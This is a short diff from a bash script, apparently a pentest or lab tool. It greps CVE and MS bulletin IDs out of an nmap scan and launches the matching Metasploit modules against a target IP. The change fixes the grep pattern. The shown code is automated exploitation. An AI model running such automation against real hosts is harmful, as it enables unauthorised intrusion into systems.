@@ -163,5 +163,5 @@ then
         exploitName=$(echo "$line" | cut -d ":" -f 2)
         echo "Executing $exploitName..."
         msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; exploit; exit;"
-    done <<< "$(grep -H -i -e 'CVE-\S\')"
+     done <<< "$(grep -H -i -e 'CVE-\S\+\|MS\d\+-\S\+' nmap-scan.txt)"
 fi
